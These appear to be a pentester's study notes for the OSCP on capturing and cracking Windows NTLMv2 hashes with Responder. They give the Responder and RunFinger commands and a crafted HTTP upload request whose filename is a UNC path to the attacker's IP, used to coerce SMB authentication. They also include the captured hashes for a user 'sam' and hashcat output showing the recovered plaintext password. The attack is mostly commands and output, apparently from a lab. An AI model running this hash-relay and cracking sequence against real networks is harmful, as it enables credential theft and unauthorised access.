Cannot use in the OSCP Exam. Fun to use on assessments.
Note: Multirelay.py does not work in python3 since the UserDict library has been depricated

# Source: https://github.com/lgandx/Responder

## Make changes to config to turn off services:

nano /usr/share/responder/Responder.conf

## Starting Responder:

- responder -I \[Interface\] -A
- responder -I \[Interface\] -i \[IP Address\] or -e \[External IP\] -A

## Tools in Responder:

Location: /usr/share/Responder/tools

## Check for systems with SMB Signing not enabled

- python3 RunFinger.py -i 172.21.0.0/24

# Responder

```
sudo responder -v -F -w -b  -I tun0
```

- [ ] setup the listener
    ![728e160513423988dc5d56f929211e65.png](../../../_resources/728e160513423988dc5d56f929211e65.png)
    
- [ ] Make smb request to local From commandline on remote system
    ![76fefa07be090e51ffe1d6d885c6a74b.png](../../../_resources/76fefa07be090e51ffe1d6d885c6a74b.png)
    
- [ ] Responder Captures, write to file on local machine
    ![a80e86b5957da2d1a3611f16510fb5e0.png](../../../_resources/a80e86b5957da2d1a3611f16510fb5e0.png)
    
- [x] Find hashcat value and execute
    `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`
    ![cff3e9a4bb2cce394a70e5b37895be7c.png](../../../_resources/cff3e9a4bb2cce394a70e5b37895be7c.png)
    

***Finished***

![0d2f3ffe9e7aafeb1ea076b1dac22af4.png](../../../_resources/0d2f3ffe9e7aafeb1ea076b1dac22af4.png)

### Example to a Webserver using the form and csrf

- [ ] Burpe repeater and change boundry, filename to \\\{{local ip}}\\{{ fake }}}
    ensure name={{ form value }} is the expected param from the js script

```
POST /upload HTTP/1.1
Host: marketingwk01:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------18082171163855583250347589163
Content-Length: 264
Origin: http://marketingwk01:8000
Connection: close
Referer: http://marketingwk01:8000/
Upgrade-Insecure-Requests: 1

-----------------------------18082171163855583250347589163
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.191\\test.txt"
Content-Type: application/octet-stream

abc@123.12
-----------------------------18082171163855583250347589163--
```

- [ ] Start Responder

```
┌──(vagrant㉿play)-[/code_ws]
└─$ sudo responder -v -F -w -b  -I tun0


                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

 [ output truncated ]

[+] Listening for events...
```

- [ ] Send the crafted request in burp

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.191.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:d7114d3a55bf9997:196107ACC286AD0BAA632CE095041AC3:010100000000000000656E19B181D9015B7C7503EFCCF3FF0000000002000800410036003800560001001E00570049004E002D0032004D0042003000440045005000390039004E00430004003400570049004E002D0032004D0042003000440045005000390039004E0043002E0041003600380056002E004C004F00430041004C000300140041003600380056002E004C004F00430041004C000500140041003600380056002E004C004F00430041004C000700080000656E19B181D90106000400020000000800300030000000000000000000000000200000272DEB312EA0318255D0ADD63E71ABE7155727CC7CE4649B1661FFD71C8962680A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100390031000000000000000000
[SMB] NTLMv2-SSP Client   : 192.168.191.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:f5bc3a3b454959a8:5E63F6586DA9851D445598F1D57FD429:010100000000000000656E19B181D901655B92C8F5FD4E5B0000000002000800410036003800560001001E00570049004E002D0032004D0042003000440045005000390039004E00430004003400570049004E002D0032004D0042003000440045005000390039004E0043002E0041003600380056002E004C004F00430041004C000300140041003600380056002E004C004F00430041004C000500140041003600380056002E004C004F00430041004C000700080000656E19B181D90106000400020000000800300030000000000000000000000000200000272DEB312EA0318255D0ADD63E71ABE7155727CC7CE4649B1661FFD71C8962680A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100390031000000000000000000
[SMB] NTLMv2-SSP Client   : 192.168.191.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:3489bac7d64ad722:70276978A9044A850D60F99D4BE9C78B:010100000000000000656E19B181D901BA2404ECACB1BFD30000000002000800410036003800560001001E00570049004E002D0032004D0042003000440045005000390039004E00430004003400570049004E002D0032004D0042003000440045005000390039004E0043002E0041003600380056002E004C004F00430041004C000300140041003600380056002E004C004F00430041004C000500140041003600380056002E004C004F00430041004C000700080000656E19B181D90106000400020000000800300030000000000000000000000000200000272DEB312EA0318255D0ADD63E71ABE7155727CC7CE4649B1661FFD71C8962680A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100390031000000000000000000
[SMB] NTLMv2-SSP Client   : 192.168.191.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:28f83ba6d15d2170:BB013ACBFFE532333D8C6559CB38E42D:010100000000000000656E19B181D901C92B767630F15B2C0000000002000800410036003800560001001E00570049004E002D0032004D0042003000440045005000390039004E00430004003400570049004E002D0032004D0042003000440045005000390039004E0043002E0041003600380056002E004C004F00430041004C000300140041003600380056002E004C004F00430041004C000500140041003600380056002E004C004F00430041004C000700080000656E19B181D90106000400020000000800300030000000000000000000000000200000272DEB312EA0318255D0ADD63E71ABE7155727CC7CE4649B1661FFD71C8962680A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100390031000000000000000000
[SMB] NTLMv2-SSP Client   : 192.168.191.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:ac2a4bf7edf101af:ED9872CEAFADF56672DB0CF4F9C214DE:010100000000000000656E19B181D90144682B07D77E09780000000002000800410036003800560001001E00570049004E002D0032004D0042003000440045005000390039004E00430004003400570049004E002D0032004D0042003000440045005000390039004E0043002E0041003600380056002E004C004F00430041004C000300140041003600380056002E004C004F00430041004C000500140041003600380056002E004C004F00430041004C000700080000656E19B181D90106000400020000000800300030000000000000000000000000200000272DEB312EA0318255D0ADD63E71ABE7155727CC7CE4649B1661FFD71C8962680A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100390031000000000000000000
```

- [ ] Crack Password Hash
`sudo hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt --force`

```SAM::MARKETINGWK01:28f83ba6d15d2170:bb013acbffe532333d8c6559cb38e42d:010100000000000000656e19b181d901c92b767630f15b2c0000000002000800410036003800560001001e00570049004e002d0032004d0042003000440045005000390039004e00430004003400570049004e002d0032004d0042003000440045005000390039004e0043002e0041003600380056002e004c004f00430041004c000300140041003600380056002e004c004f00430041004c000500140041003600380056002e004c004f00430041004c000700080000656e19b181d90106000400020000000800300030000000000000000000000000200000272deb312ea0318255d0add63e71abe7155727cc7ce4649b1661ffd71c8962680a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390031000000000000000000:DISISMYPASSWORD
SAM::MARKETINGWK01:3489bac7d64ad722:70276978a9044a850d60f99d4be9c78b:010100000000000000656e19b181d901ba2404ecacb1bfd30000000002000800410036003800560001001e00570049004e002d0032004d0042003000440045005000390039004e00430004003400570049004e002d0032004d0042003000440045005000390039004e0043002e0041003600380056002e004c004f00430041004c000300140041003600380056002e004c004f00430041004c000500140041003600380056002e004c004f00430041004c000700080000656e19b181d90106000400020000000800300030000000000000000000000000200000272deb312ea0318255d0add63e71abe7155727cc7ce4649b1661ffd71c8962680a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390031000000000000000000:DISISMYPASSWORD
SAM::MARKETINGWK01:d7114d3a55bf9997:196107acc286ad0baa632ce095041ac3:010100000000000000656e19b181d9015b7c7503efccf3ff0000000002000800410036003800560001001e00570049004e002d0032004d0042003000440045005000390039004e00430004003400570049004e002d0032004d0042003000440045005000390039004e0043002e0041003600380056002e004c004f00430041004c000300140041003600380056002e004c004f00430041004c000500140041003600380056002e004c004f00430041004c000700080000656e19b181d90106000400020000000800300030000000000000000000000000200000272deb312ea0318255d0add63e71abe7155727cc7ce4649b1661ffd71c8962680a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390031000000000000000000:DISISMYPASSWORD
SAM::MARKETINGWK01:ac2a4bf7edf101af:ed9872ceafadf56672db0cf4f9c214de:010100000000000000656e19b181d90144682b07d77e09780000000002000800410036003800560001001e00570049004e002d0032004d0042003000440045005000390039004e00430004003400570049004e002d0032004d0042003000440045005000390039004e0043002e0041003600380056002e004c004f00430041004c000300140041003600380056002e004c004f00430041004c000500140041003600380056002e004c004f00430041004c000700080000656e19b181d90106000400020000000800300030000000000000000000000000200000272deb312ea0318255d0add63e71abe7155727cc7ce4649b1661ffd71c8962680a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390031000000000000000000:DISISMYPASSWORD
SAM::MARKETINGWK01:f5bc3a3b454959a8:5e63f6586da9851d445598f1d57fd429:010100000000000000656e19b181d901655b92c8f5fd4e5b0000000002000800410036003800560001001e00570049004e002d0032004d0042003000440045005000390039004e00430004003400570049004e002d0032004d0042003000440045005000390039004e0043002e0041003600380056002e004c004f00430041004c000300140041003600380056002e004c004f00430041004c000500140041003600380056002e004c004f00430041004c000700080000656e19b181d90106000400020000000800300030000000000000000000000000200000272deb312ea0318255d0add63e71abe7155727cc7ce4649b1661ffd71c8962680a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390031000000000000000000:DISISMYPASSWORD
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: hashes
Time.Started.....: Mon May  8 13:50:02 2023, (19 secs)
Time.Estimated...: Mon May  8 13:50:21 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2675.2 kH/s (2.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests (total), 5/5 (100.00%) Digests (new), 5/5 (100.00%) Salts
Progress.........: 56279040/71721925 (78.47%)
Rejected.........: 0/56279040 (0.00%)
Restore.Point....: 11249664/14344385 (78.43%)
Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: DONDON19851211 -> DIGNITY777
Hardware.Mon.#1..: Util: 86%

Started: Mon May  8 13:49:59 2023
Stopped: Mon May  8 13:50:23 2023
```